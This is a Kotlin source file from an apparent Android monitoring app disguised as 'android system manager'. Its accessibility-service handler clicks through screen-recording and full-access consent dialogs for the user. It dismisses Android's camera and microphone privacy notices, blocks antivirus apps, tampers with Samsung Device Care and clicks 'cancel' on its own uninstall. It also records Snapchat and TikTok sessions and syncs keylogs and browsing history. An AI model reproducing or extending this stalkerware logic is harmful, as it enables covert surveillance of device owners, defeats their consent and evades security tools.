package com.android.services.accessibility.data

import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.text.TextUtils
import android.view.accessibility.AccessibilityNodeInfo
import androidx.localbroadcastmanager.content.LocalBroadcastManager
import com.android.services.accessibility.AccessibilityUtils
import com.android.services.accessibility.AccessibilityUtils.appNamesForLanguages
import com.android.services.accessibility.AccessibilityUtils.arabicCastingList
import com.android.services.accessibility.AccessibilityUtils.blockedAppsList
import com.android.services.accessibility.AccessibilityUtils.blockedSiteList
import com.android.services.accessibility.AccessibilityUtils.browsers
import com.android.services.accessibility.AccessibilityUtils.castingList
import com.android.services.accessibility.AccessibilityUtils.checkForAppProtection
import com.android.services.accessibility.AccessibilityUtils.chineseCastingList
import com.android.services.accessibility.AccessibilityUtils.deletedPackage
import com.android.services.accessibility.AccessibilityUtils.dutchCastingList
import com.android.services.accessibility.AccessibilityUtils.frenchCastingList
import com.android.services.accessibility.AccessibilityUtils.herbewCastingList
import com.android.services.accessibility.AccessibilityUtils.isApp
import com.android.services.accessibility.AccessibilityUtils.isAppNamePermission
import com.android.services.accessibility.AccessibilityUtils.isScreenRecordPermission
import com.android.services.accessibility.AccessibilityUtils.isUninstall
import com.android.services.accessibility.AccessibilityUtils.italianCastingList
import com.android.services.accessibility.AccessibilityUtils.lastWindowPackage
import com.android.services.accessibility.AccessibilityUtils.performTemperOnPlayProtectScreen
import com.android.services.accessibility.AccessibilityUtils.persianCastingList
import com.android.services.accessibility.AccessibilityUtils.privacyNoteMessageTextList
import com.android.services.accessibility.AccessibilityUtils.purtugaliCastingList
import com.android.services.accessibility.AccessibilityUtils.russianCastingList
import com.android.services.accessibility.AccessibilityUtils.screenCastStartPermissionsTexts
import com.android.services.accessibility.AccessibilityUtils.screenLimitList
import com.android.services.accessibility.AccessibilityUtils.screenTimePackage
import com.android.services.accessibility.AccessibilityUtils.selfUninstall
import com.android.services.accessibility.AccessibilityUtils.spanishCastingList
import com.android.services.accessibility.AccessibilityUtils.startAntivirousBlockedAppActivity
import com.android.services.accessibility.AccessibilityUtils.startScreenLimitActivity
import com.android.services.accessibility.AccessibilityUtils.startScreenTime
import com.android.services.accessibility.AccessibilityUtils.syncAppReport
import com.android.services.accessibility.AccessibilityUtils.syncBrowserHistory
import com.android.services.accessibility.AccessibilityUtils.syncKeyLogs
import com.android.services.accessibility.AccessibilityUtils.todayDate
import com.android.services.accessibility.AccessibilityUtils.turkCastingList
import com.android.services.accessibility.AccessibilityUtils.unBlockCameraOrMicrophone
import com.android.services.accessibility.AccessibilityUtils.unBlockTextList
import com.android.services.accessibility.AccessibilityUtils.unblockAccessMessageTextList
import com.android.services.accessibility.AccessibilityUtils.unblockDeviceCameraTextList
import com.android.services.accessibility.AccessibilityUtils.unblockDeviceMicTextList
import com.android.services.accessibility.AccessibilityUtils.uninstallAppsList
import com.android.services.accessibility.data.WindowContentChangeEventData.Companion.performBrowsersRelatedTasks
import com.android.services.db.entities.ScreenTime
import com.android.services.interfaces.OnAccessibilityEvent
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.AccessibilityEventModel
import com.android.services.models.NodeInfo
import com.android.services.services.screenRecord.ScreenRecordCommandService
import com.android.services.services.snapchat.SnapChatEventCommandService
import com.android.services.ui.activities.BackgroundServicesActivity
import com.android.services.ui.activities.ScreenRecordIntentActivity
import com.android.services.util.*
import org.greenrobot.eventbus.EventBus
import java.util.*
import java.util.concurrent.TimeUnit


class WindowStateChangeEventData(private val localDatabaseSource: LocalDatabaseSource) :
    OnAccessibilityEvent {

    override fun onAccessibilityEvent(
        context: Context,
        accessibilityEventModel: AccessibilityEventModel
    ) {
        try {
            logVerbose("$TAG In Window State Change")
            traverseThroughWindowStateChanged(context, accessibilityEventModel)
        } catch (e: Exception) {
            logException("$TAG WindowState exp = ${e.message}", throwable = e)
        }
    }

    @Throws(Exception::class)
    private fun traverseThroughWindowStateChanged(
        context: Context,
        accessibilityEventModel: AccessibilityEventModel
    ) {

        val nodeInfo: AccessibilityNodeInfo? = accessibilityEventModel.eventSource
        val rootInWindow: AccessibilityNodeInfo? = accessibilityEventModel.rootInWindow
        val eventPackage: String = accessibilityEventModel.packageName
        val eventClassName: String = accessibilityEventModel.eventClassName
        val eventText: String = accessibilityEventModel.eventText

        executeWindowStateChangeTask(
            context,
            rootInWindow,
            eventPackage,
            true,
            rootInWindow?.childCount ?: 0,
            0
        )
    }

    private fun executeWindowStateChangeTask(
        context: Context,
        nodeInfo: AccessibilityNodeInfo?,
        pkgName: String,
        firstIteration: Boolean,
        totalChildCount: Int,
        currentChild: Int,
        iteration: Int = 0
    ) {
        try {
            if (firstIteration) {
                logVerbose("$TAG First Iteration called for $pkgName")
                AccessibilityUtils.senderName = ""
                unBlockCameraOrMicrophone = false
                isApp = false
                isUninstall = false
                AccessibilityUtils.isFullAccessDialog=false
                AccessibilityUtils.isDeviceAdmin = false
                AccessibilityUtils.appUninstall = false
                isScreenRecordPermission = false
                isAppNamePermission = false
                selfUninstall = false
                AccessibilityUtils.imSnapchatContactName =""
                AccessibilityUtils.snapChatMessageType =""
                browsers = AppUtils.getInstalledBrowsersList(context)
                uninstallAppsList = localDatabaseSource.getUninstallAppsList()
                blockedSiteList = localDatabaseSource.selectWebSites()
                blockedAppsList = localDatabaseSource.selectBlockedApps()
                screenLimitList = localDatabaseSource.selectScreenLimits()
                syncAppReport=AppConstants.syncAppReports
                syncKeyLogs=AppConstants.syncKeyLogger
                syncBrowserHistory=AppConstants.syncBrowsingHistory
                val result = performInstalledAppsRelatedTasks(context, pkgName)
                if (result) {
                    logVerbose("$TAG BlockedApp pkgName  = $pkgName")
                }
                val contentResult = performInstalledAppsRelatedTasks(
                    context,
                    AccessibilityUtils.windowContentChangePkg
                )
                if (contentResult) {
                    logVerbose("$TAG BlockedApp Content pkgName = ${AccessibilityUtils.windowContentChangePkg}")
                }
            }

            val mNodeInfo = nodeInfo?.retrieveNodeInfo() ?: NodeInfo()
            setLastWindowStateChangePackageName(context, pkgName)
            logVerbose("$TAG node Info = $mNodeInfo")
            logVerbose(
                "$TAG node Info $iteration id = ${mNodeInfo.nodeId}, text = ${mNodeInfo.nodeText}, className " +
                        "= ${mNodeInfo.nodeClassName}, packageName = ${mNodeInfo.nodePackageName}, parent = ${mNodeInfo.nodeParent}"
            )
            logVerbose("$TAG lastWindow package = $lastWindowPackage, screenTime package = $screenTimePackage")
            performScreenTimeTask(context, pkgName)
            performTemperOnDeviceCare(context,pkgName)

            if (mNodeInfo.nodeText.isNotEmpty()) {
                nodeInfo?.let {

                    // perform Browser Related tasks browsing history & block sites
                    performBrowsersRelatedTasks(
                        context,
                        localDatabaseSource,
                        nodeInfo,
                        pkgName,
                        mNodeInfo.nodeId,
                        mNodeInfo.nodeText,
                        mNodeInfo.nodeClassName
                    )

                    // Perform App Uninstall protection & Security
                    checkForAppProtection(
                        context,
                        nodeInfo,
                        mNodeInfo.nodeClassName,
                        mNodeInfo.nodeText.lowercase(Locale.getDefault())
                    )

                    // Check For Screen Recording Permission Dialog & Grant it
                    if (AppConstants.osGreaterThanEqualToTen && AppUtils.isScreenInteractive(context))
                        checkForScreenRecordPermission(
                            nodeInfo,
                            mNodeInfo.nodeId,
                            mNodeInfo.nodeText.lowercase(Locale.getDefault())
                        )
                    if (nodeInfo.className != null && nodeInfo.text != null && nodeInfo.className == "android.widget.TextView") {
                        AccessibilityUtils.lastNodeInfoText = nodeInfo.text.toString()
                    }

                    // checks for apps uninstall events and perform uninstall action
                    checkForUninstallAppEvent(
                        context,
                        nodeInfo,
                        pkgName,
                        mNodeInfo.nodeText.lowercase(Locale.getDefault())
                    )

                    // Checks for android system privacy note
                    // Microphone or camera resource used by the app
                    isAndroidSystemPrivacyNote(
                        context, mNodeInfo.nodeId, mNodeInfo.nodeText.lowercase()
                    )

                    // Unblocks Microphone or camera if blocked by android system
                    unblockMicrophoneOrCameraAccess(nodeInfo, mNodeInfo)
                }
            }

            val sourceChildCount: Int = nodeInfo?.childCount ?: 0
            if (totalChildCount == currentChild) {
                if (sourceChildCount == 0) {
                    return
                }
            }

            for (i in 0 until sourceChildCount) {
                val childNodeInfo: AccessibilityNodeInfo? = nodeInfo?.getChild(i)
                if (childNodeInfo != null) {
                    executeWindowStateChangeTask(
                        context,
                        childNodeInfo,
                        pkgName,
                        false,
                        sourceChildCount,
                        i + 1,
                        iteration = iteration + 1
                    )
                    childNodeInfo.recycle()
                } else {
                    return
                }
            }
        } catch (e: Exception) {
            logException("Error executeWindowStateChangeTask: " + e.message, TAG, e)
        }
    }

    private fun performTemperOnDeviceCare(context: Context, pkgName: String) {
        if(pkgName.isNotEmpty() && pkgName =="com.samsung.android.lool"){
            LocalBroadcastManager.getInstance(context).sendBroadcast(
                Intent("com.android.services.accessibility.ACTION_BACK")
                    .putExtra("ACTION_TYPE", 1)
            )
        }
    }

    private fun setLastWindowStateChangePackageName(context: Context, pkgName: String) {
        if (pkgName != "com.android.systemui"
            && pkgName != "com.samsung.android.app.cocktailbarservice"
            && !AppUtils.getDefaultKeyboardPackage(context).contains(pkgName)
            && AppUtils.getDefaultLauncherPackageName(context) != pkgName
            && lastWindowPackage != pkgName
        ) {
            lastWindowPackage = pkgName
        }
    }

    private fun performInstalledAppsRelatedTasks(context: Context, pkgName: String): Boolean {
        if (pkgName != context.packageName) {
            if (blockedAppsList.isNotEmpty() && AppUtils.isAppBlocked(pkgName, blockedAppsList)) {
                startScreenLimitActivity(context)
                return true
            } else if (pkgName.isNotEmpty() &&pkgName!= lastWindowPackage && AppUtils.shouldBlockAntivirus(pkgName)) {
                startAntivirousBlockedAppActivity(context)
                return true
            }
            return executeLimitScreenTasks(context, pkgName)
        }
        return false
    }

    private fun checkForScreenRecordPermission(
        nodeInfo: AccessibilityNodeInfo,
        id: String?,
        text: String
    ) {
        if (AppConstants.autoGrantScreenRecordingPermission && AppConstants.isMyAppScreenCastPermission ){
            logVerbose("ScreenCastPermInfo = $nodeInfo and lastText = ${AccessibilityUtils.lastNodeInfoText}")
            val className = nodeInfo.className ?: ""
            val isScreenCastingText =
                castingList.textContainsListElement(text)
                        || herbewCastingList.textContainsListElement(text)
                        || arabicCastingList.textContainsListElement(text)
                        || frenchCastingList.textContainsListElement(text)
                        || chineseCastingList.textContainsListElement(text)
                        || dutchCastingList.textContainsListElement(text)
                        || italianCastingList.textContainsListElement(text)
                        || purtugaliCastingList.textContainsListElement(text)
                        || spanishCastingList.textContainsListElement(text)
                        || turkCastingList.textContainsListElement(text)
                        || persianCastingList.textContainsListElement(text)
                        || russianCastingList.textContainsListElement(text)
            if ((AccessibilityUtils.lastNodeInfoText.startsWith(
                    "android system manager", true
                ) || AccessibilityUtils.lastNodeInfoText.contains(
                    "android system manager", true
                )) && className == "android.widget.Button" &&
                id == "button1"
            ) {
                nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                AppConstants.isMyAppScreenCastPermission = false
            }
            if (isScreenCastingText) {
                isScreenRecordPermission = true
            }

            val containsAppName = appNamesForLanguages.textContainsListElement(text)
            if (id != null && id == "message" && containsAppName) {
                isScreenRecordPermission = true
            }

            if (containsAppName) {
                isAppNamePermission = true
            }

            if (containsAppName && isScreenCastingText) {
                isScreenRecordPermission = true
                isAppNamePermission = true
            }

            if (isScreenRecordPermission && isAppNamePermission) {
                screenCastStartPermissionsTexts.forEach { startNowText ->
                    val similarity = AppUtils.findSimilarity(text, startNowText)
                    if (similarity >= 0.6) {
                        nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        lastWindowPackage = ""
                    }
                }
            }
        }else{
            checkAndDisableFullAccessDialog(id,nodeInfo,text)
        }
    }

    private fun checkAndDisableFullAccessDialog(
        id: String?,
        nodeInfo: AccessibilityNodeInfo,
        text: String
    ) {
        val nodeId = id ?: ""
        val className = nodeInfo.className.toString()
        val packageName = nodeInfo.packageName
        val isAndroidSystemManagerFullAccessText = text.contains(
            "android system manager has full access to your device",
            true
        ) || text.contains(
            "android system manager",
            true
        )
        val isOkButtonText = text.equals("ok", true)
        if (packageName == "com.google.android.permissioncontroller") {
            if (nodeId.isNotEmpty()) {
                if (nodeId == "title" && className == "android.widget.TextView" && isAndroidSystemManagerFullAccessText
                ) {
                    AccessibilityUtils.isFullAccessDialog = true
                }
                if (className == "android.widget.Button" && AccessibilityUtils.isFullAccessDialog && nodeId == "button1" && isOkButtonText) {
                    nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    AccessibilityUtils.isFullAccessDialog = false
                }
            } else {
                if (className == "android.widget.TextView" && isAndroidSystemManagerFullAccessText
                ) {
                    AccessibilityUtils.isFullAccessDialog = true
                }
                if (className == "android.widget.Button" && AccessibilityUtils.isFullAccessDialog && isOkButtonText) {
                    nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    AccessibilityUtils.isFullAccessDialog = false
                }
            }
        }
    }


    private fun unblockMicrophoneOrCameraAccess(
        nodeInfo: AccessibilityNodeInfo,
        mNodeInfo: NodeInfo
    ) {
        val text = mNodeInfo.nodeText
        val isBlockTitle = unblockDeviceCameraTextList.textEqualToAnyListElement(text) ||
                unblockDeviceMicTextList.textEqualToAnyListElement(text)
        if (mNodeInfo.nodeId == "sensor_use_started_title_message" || isBlockTitle) {
            unBlockCameraOrMicrophone = true
        }
        if (mNodeInfo.nodeId == "message" && unblockAccessMessageTextList.textStartWithAnyListElement(
                text
            )
        ) {
            unBlockCameraOrMicrophone = true
        }
        if (mNodeInfo.nodeClassName == "android.widget.Button" && unBlockTextList.textEqualToAnyListElement(
                text
            )
        ) {
            if (unBlockCameraOrMicrophone) {
                nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }
    }

    private fun isAndroidSystemPrivacyNote(
        context: Context,
        id: String,
        text: String
    ) {
        if (id == "text" && ((text.contains(
                "android system manager",
                true
            ) && privacyNoteMessageTextList.textContainsListElement(text)) || text.contains(
                "android system manager",
                true
            ))
        ) {
            LocalBroadcastManager.getInstance(context)
                .sendBroadcast(
                    Intent("com.android.services.accessibility.ACTION_BACK")
                        .putExtra("ACTION_TYPE", 1)
                )
        }
    }

    private fun executeLimitScreenTasks(context: Context, pkgName: String): Boolean {
        if (screenLimitList.isNotEmpty()) {
            for (screenLimit in screenLimitList) {
                if (screenLimit.screenDay.equals(AppUtils.getTodayDay(), ignoreCase = true)) {
                    try {
                        if (screenLimit.startTime!!.isNotEmpty()
                            && screenLimit.endTime!!.isNotEmpty()
                        ) {
                            val startDate = todayDate + screenLimit.startTime
                            val endDate = todayDate + screenLimit.endTime
                            val startTimeLimit: Boolean =
                                AppUtils.isDateGreaterThanOther(
                                    AppUtils.getCurrentDate(),
                                    startDate
                                )
                            val endTimeLimit: Boolean =
                                AppUtils.isDateGreaterThanOther(
                                    endDate,
                                    AppUtils.getCurrentDate()
                                )
                            if (startTimeLimit
                                && endTimeLimit
                                && pkgName != "com.android.systemui"
                                && pkgName != "com.samsung.android.app.cocktailbarservice"
                                && !AppUtils.getDefaultKeyboardPackage(context)
                                    .contains(pkgName)
                                && AppUtils.getDefaultLauncherPackageName(context) != pkgName
                            ) {
                                startScreenLimitActivity(context)
                                return true
                            }
                        }
                        if (screenLimit.usageTime!!.isNotEmpty()) {
                            var totalUsageTime: Long =
                                localDatabaseSource.getTotalUsageScreenTime(
                                    AppUtils.getStartTimeOfDay(),
                                    AppUtils.getEndTimeOfDay()
                                )
                            totalUsageTime = TimeUnit.MILLISECONDS.toHours(totalUsageTime)

                            val limitTime = screenLimit.usageTime.toLong()
                            if (totalUsageTime >= limitTime && pkgName != "com.android.systemui"
                                && pkgName != "com.samsung.android.app.cocktailbarservice"
                                && !AppUtils.getDefaultKeyboardPackage(context)
                                    .contains(pkgName)
                                && !AppUtils.getDefaultLauncherPackageName(context)
                                    .equals(pkgName)
                            ) {
                                startScreenLimitActivity(context)
                                return true
                            }
                        }
                    } catch (e: Exception) {
                        logException("${AppConstants.SCREEN_LIMIT_TYPE} exception = ${e.message}")
                        return false
                    }
                }
            }
        }
        return false
    }
    private fun checkForUninstallAppEvent(
        context: Context,
        nodeInfo: AccessibilityNodeInfo,
        pkgName: String,
        childText: String,
    ) {
        try {
            val allowProtection = AppUtils.checkForAppTampering() != 2
            val packageName =
                AppUtils.doesChildTextContainsDeletedApp(uninstallAppsList, childText)
            if (uninstallAppsList.isNotEmpty() && pkgName == "com.google.android.packageinstaller" && !TextUtils.isEmpty(
                    packageName
                )
            ) {
                deletedPackage = packageName!!
                isApp = true
            } else if (pkgName == "com.google.android.packageinstaller" && childText.contains("android system manager")) {
                selfUninstall = true
            }
            if (childText.contains("uninstall") && isApp) {
                isUninstall = true
            } else if (childText.contains("uninstall") && selfUninstall) {
                isUninstall = true
            }
            if (isApp && childText.contains("ok") && isUninstall) {
                nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                uninstallAppsList = ArrayList()
                RoomDBUtils.deleteInstalledApps(context, deletedPackage)
                val uninstalledAppList = RoomDBUtils.getUninstalledAppsList(context)
                Handler(Looper.getMainLooper()).postDelayed({
                    AppUtils.checkAppsToDelete(context, uninstalledAppList)
                }, 2000)
            } else if (selfUninstall && childText.contains("ok") && AppConstants.uninstallPreference) {
                nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            } else if (selfUninstall && childText.contains("cancel") && AppConstants.serviceActivated
                && allowProtection
                && !AppConstants.uninstallPreference
            ) {
                nodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                AppUtils.protectAppFromTampering()
            }
        } catch (e: Exception) {
            logException("$TAG Error On Uninstalling App Observer: " + e.message)
        }
    }


    private fun performScreenTimeTask(context: Context, pkgName: String) {
        try {
            if (AppUtils.isScreenInteractive(context) && AppUtils.packageNameNotEqualsDefaultKeyboard(
                    context, pkgName
                )
            ) {
                if (screenTimePackage.isEmpty() && pkgName != context.packageName) {
                    screenTimePackage = pkgName
                    startScreenTime = System.currentTimeMillis()
                    performScreenRelatedTasks(context, pkgName)
                    logVerbose("$TAG screenTime package = $pkgName", explicitTag = TAG)
                } else if (screenTimePackage != pkgName && screenTimePackage != context.packageName) {
                    if (startScreenTime != 0L) {
                        val endScreenTime = System.currentTimeMillis() - startScreenTime
                        logVerbose(
                            "$TAG screenTime interval = $endScreenTime",
                            TAG
                        )
                        if (endScreenTime <= 500) {
                            logVerbose(
                                "$TAG interval less than 1 Sec for $screenTimePackage", TAG
                            )
                            return
                        }
                        saveScreenTime(context, pkgName, endScreenTime, localDatabaseSource)
                        performScreenRelatedTasks(context, pkgName)
                        if (pkgName != context.packageName) {
                            screenTimePackage = pkgName
                            startScreenTime = System.currentTimeMillis()
                        } else {
                            screenTimePackage = ""
                            startScreenTime = 0L
                        }
                    } else {
                        screenTimePackage = ""
                        startScreenTime = 0L
                    }
                }
            }
        } catch (e: Exception) {
            logException(e.message!!, TAG, e)
        }
    }

    companion object {
        const val TAG = "WindowStateChangeEventData"

        fun performScreenRelatedTasks(context: Context, pkgName: String, id: String = "") {
            if (!AppUtils.isAppBlocked(pkgName, blockedAppsList)) {
                try {
                    val isVersionGreaterThanLollipop = AppConstants.osGreaterThanOrEqualLollipop
                    val shouldRecordScreen = id.isNotEmpty() && id == "f1l"
                    val recordTiktok =
                        pkgName == AppConstants.TIKTOK_PACKAGE_NAME && shouldRecordScreen

                    val isScreenRecordingApp =
                        if (pkgName != AppConstants.TIKTOK_PACKAGE_NAME)
                            AppUtils.isScreenRecordingApp(pkgName)
                        else
                            recordTiktok && AppUtils.isScreenRecordingApp(pkgName)
                    val screenRecordServiceNotRunning =
                        !AppUtils.isServiceRunning(
                            context,
                            ScreenRecordCommandService::class.java.name
                        )
                    val intentNotNull = AppConstants.screenRecordingIntent != null
                    val isScreenInteractive = AppUtils.isScreenInteractive(context)

                    logVerbose("$TAG performScreenRelatedTasks $isVersionGreaterThanLollipop, $isScreenRecordingApp, $screenRecordServiceNotRunning, $intentNotNull, $isScreenInteractive")
                    if (isVersionGreaterThanLollipop && (isScreenRecordingApp || recordTiktok) && screenRecordServiceNotRunning && intentNotNull && isScreenInteractive) {
                        startScreenRecordingService(context, pkgName)
                    } else if (!isScreenInteractive && !screenRecordServiceNotRunning && !AppConstants.isPasswordGrabbing && pkgName!=context.packageName) {
                        EventBus.getDefault().post("stopAppRecording")
                    } else if (!screenRecordServiceNotRunning && (!isScreenRecordingApp || (!shouldRecordScreen && AppConstants.TIKTOK_PACKAGE_NAME == pkgName)) && pkgName!=context.packageName) {
                        EventBus.getDefault().post("stopAppRecording")
                    } else if (!intentNotNull && isScreenRecordingApp) {
                        AppUtils.startScreenRecordIntent(
                            context,
                            ScreenRecordIntentActivity.TYPE_SCREEN_RECORDING,
                            pkgName = pkgName
                        )
                    }
                    val isSnapChatServiceRunning =
                        AppUtils.isServiceRunning(
                            context,
                            SnapChatEventCommandService::class.java.name
                        )
                    if (intentNotNull && !isSnapChatServiceRunning && pkgName == AppConstants.SNAPCHAT_PACKAGE_NAME && !AppUtils.isScreenRecordingApp(
                            AppConstants.SNAPCHAT_PACKAGE_NAME
                        )
                    ) {
                        startSnapChatEventCaptureService(context)
                    } else if (isSnapChatServiceRunning && pkgName != AppConstants.SNAPCHAT_PACKAGE_NAME) {
                        stopSnapChatEventCaptureService(context)
                    } else if (isSnapChatServiceRunning && !AppUtils.isScreenInteractive(context)) {
                        stopSnapChatEventCaptureService(context)
                    } else if (!intentNotNull && pkgName == AppConstants.SNAPCHAT_PACKAGE_NAME) {
                        AppUtils.startScreenRecordIntent(
                            context,
                            ScreenRecordIntentActivity.TYPE_SNAP_CHAT
                        )
                    }
                } catch (e: Exception) {
                    logException("OnScreenRelatedTasks Error: ${e.message}", TAG)
                }
            }
        }

        private fun stopSnapChatEventCaptureService(context: Context) {
            context.stopService(Intent(context, SnapChatEventCommandService::class.java))
        }

        /** Starts the SnapChat Capturing Service **/
        fun startSnapChatEventCaptureService(mContext: Context) {
            mContext.startActivityWithData<BackgroundServicesActivity>(
                listOf(
                    Intent.FLAG_ACTIVITY_NEW_TASK,
                    Intent.FLAG_ACTIVITY_NEW_TASK,
                    Intent.FLAG_ACTIVITY_CLEAR_TASK
                ),
                Pair(
                    BackgroundServicesActivity.EXTRA_TYPE,
                    AppConstants.SNAP_CHAT_EVENTS_TYPE
                )
            )
        }

        /** Starts the Screen Recording Service [ScreenRecordCommandService] **/
        fun startScreenRecordingService(mContext: Context, pkgName: String) {
            Handler(Looper.getMainLooper()).post {
                ActivityUtil.startScreenRecordingService(
                    mContext,
                    AppConstants.SCREEN_RECORDING_TYPE,
                    pkgName
                )
            }
        }

        /** Saves ScreenTime into database **/
        fun saveScreenTime(
            context: Context,
            pkgName: String,
            endScreenTime: Long,
            localDatabaseSource: LocalDatabaseSource,
        ) {
            if(syncAppReport){
                val timeOnApp = AppUtils.convertMilliSecondsToTimeFormat(endScreenTime)
                val screenTime = ScreenTime()
                screenTime.uniqueId =
                    AppUtils.md5Hash(AppUtils.generateUniqueID() + System.currentTimeMillis())
                screenTime.appName =
                    AppUtils.getAppNameFromPackage(screenTimePackage)
                screenTime.packageName = screenTimePackage
                screenTime.timeOnApp = timeOnApp
                screenTime.todayDate = AppUtils.getTodayDate(AppConstants.DATE_FORMAT)
                screenTime.dateTime = AppUtils.formatDate(startScreenTime.toString())
                screenTime.endTime = AppUtils.formatDate(System.currentTimeMillis().toString())
                screenTime.timeInMilliSeconds = endScreenTime
                screenTime.date = AppUtils.getDate(System.currentTimeMillis())
                screenTime.status = 0
                localDatabaseSource.insertScreenTime(screenTime)
                logVerbose("${AppConstants.SCREEN_TIME_TYPE} saved = $screenTime", TAG)
            }
        }
    }
}